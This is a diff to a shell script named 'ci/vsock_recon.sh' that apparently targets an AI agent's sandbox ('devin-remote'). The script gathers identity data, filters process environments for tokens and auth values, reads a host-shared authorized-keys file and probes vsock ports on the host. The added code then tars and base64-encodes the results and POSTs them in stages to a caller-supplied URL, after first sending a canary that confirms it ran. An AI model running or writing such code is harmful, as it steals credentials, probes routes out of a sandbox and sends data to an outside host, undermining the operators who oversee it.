@@ -1,10 +1,16 @@
 #!/bin/sh
-# i73134 vsock/host-channel read-only recon. Invoked as: sh ./ci/vsock_recon.sh "<url>"
+# i73134 vsock/host-channel read-only recon (v2: bounded per-port timeout + staged POSTs)
+# Invoked as: sh ./ci/vsock_recon.sh "<base-url>"
 U="$1"
-W=/tmp/i73134r; mkdir -p "$W"
+W=/tmp/i73134v2; mkdir -p "$W"
 R=$W/raw.txt; : >"$R"
 export LC_ALL=C
 hdr(){ printf '\n===== %s =====\n' "$*" >>"$R"; }
+post(){ f="$1"; tag="$2"; code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 25 -X POST --data-binary @"$f" "$U/$tag" 2>/dev/null); echo "POST $tag CODE=$code BYTES=$(wc -c <"$f")" >>"$R"; }
+
+# --- canary: proves the script actually executed in the sandbox ---
+printf 'canary tag=i73134 host=%s date=%s uid=%s\n' "$(hostname)" "$(date -u +%FT%TZ)" "$(id -u)" > "$W/canary.txt"
+post "$W/canary.txt" canary
 
 hdr "WHOAMI"; id >>"$R" 2>&1; hostname >>"$R" 2>&1; date -u >>"$R" 2>&1; uname -a >>"$R" 2>&1
 
@@ -17,32 +23,6 @@ hdr "SYS_CLASS_VSOCK"; ls -la /sys/class/vsock /dev/vsock /dev/vhost-vsock >>"$R
 hdr "MODULES"; grep -E 'vsock|vhost' /proc/modules >>"$R" 2>&1
 hdr "FD_VSOCK"; for d in /proc/[0-9]*/fd; do ls -l "$d" 2>/dev/null | grep -i vsock; done | head -40 >>"$R" 2>&1
 hdr "DEVR_PROC"; for p in $(pgrep -f devin-remote 2>/dev/null); do echo "PID=$p"; tr '\0' ' ' </proc/$p/cmdline 2>/dev/null; echo; tr '\0' '\n' </proc/$p/environ 2>/dev/null | grep -Ei 'vsock|cid|host|token|auth|port|proxy'; done >>"$R" 2>&1
-
-hdr "PY_AF_VSOCK_CONNECT"
-python3 - >>"$R" 2>&1 <<'PY'
-import socket, errno, time
-print("has_AF_VSOCK=%s" % hasattr(socket,"AF_VSOCK"))
-if hasattr(socket,"AF_VSOCK"):
-    def conn(cid, port, t=1.0):
-        try:
-            s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
-        except OSError as e:
-            return "socket_err:%s(%s)" % (errno.errorcode.get(e.errno, e.errno), e.strerror)
-        s.settimeout(t)
-        try:
-            s.connect((cid, port)); res = "success"
-        except socket.timeout:
-            res = "timeout"
-        except OSError as e:
-            res = "oserror:%s(%s)" % (errno.errorcode.get(e.errno, e.errno), e.strerror)
-        finally:
-            try: s.close()
-            except Exception: pass
-        return res
-    for cid, ports in ((2,[22,1024,2375,2376,5000,7000,8000,8080,9090]),(3,[22,1024])):
-        for p in ports:
-            print("CID=%d PORT=%d RESULT=%s" % (cid,p,conn(cid,p)), flush=True)
-PY
 
 hdr "VSAUTH_FILE"; file /mnt/host_share/vsock-authorized-keys 2>&1 >>"$R"; ls -la /mnt/host_share/vsock-authorized-keys >>"$R" 2>&1
 hdr "VSAUTH_STRINGS_FILTERED"; strings -n6 /mnt/host_share/vsock-authorized-keys 2>/dev/null | grep -Ei 'ssh|auth|port|vsock|CID|agent|proxy|token' | head -60 >>"$R" 2>&1
@@ -65,9 +45,30 @@ probe(){ port="$1"; tag="$2"; tok="$3"; f="$W/b_${port}_${tag}.bin"; code=$(curl
 for p in 6080 6789 9876; do probe "$p" "tok1" "$T1"; done
 for p in 6080 6789 9876; do probe "$p" "tok2" "$T2"; done
 
+# stage 1: everything except vsock connect
+tar czf "$W/p1.tgz" -C /tmp i73134v2 2>/dev/null; base64 -w0 "$W/p1.tgz" >"$W/p1.b64"
+post "$W/p1.b64" part1
+
+# stage 2: bounded vsock connect matrix (each port under `timeout 3`)
+hdr "PY_AF_VSOCK_CONNECT"
+for spec in "2:22" "2:1024" "2:2375" "2:2376" "2:5000" "2:7000" "2:8000" "2:8080" "2:9090" "3:22" "3:1024"; do
+  cid=${spec%%:*}; port=${spec##*:}
+  out=$(timeout 3 python3 -c "
+import socket,sys
+cid,port=$cid,$port
+if not hasattr(socket,'AF_VSOCK'):
+    print('no_AF_VSOCK'); sys.exit(0)
+s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(2)
+try:
+    s.connect((cid,port)); print('success')
+except Exception as e:
+    print('err:%s:%s' % (type(e).__name__,e))
+" 2>&1); rc=$?
+  echo "CID=$cid PORT=$port RC=$rc OUT=$out" >>"$R"
+done
+
 hdr "DONE"
-tar czf - -C /tmp i73134r 2>/dev/null | base64 -w0 >"$W/b64.txt"
-BYTES=$(wc -c <"$W/b64.txt")
-echo "PAYLOAD_B64_BYTES=$BYTES"
-curl -sS -o /dev/null -w 'SINK_CODE=%{http_code}\n' --max-time 30 -X POST --data-binary @"$W/b64.txt" "$U" 2>&1
+base64 -w0 "$W/raw.txt" >"$W/p2.b64"
+post "$W/p2.b64" part2
+echo "PAYLOAD_OK"
 exit 0
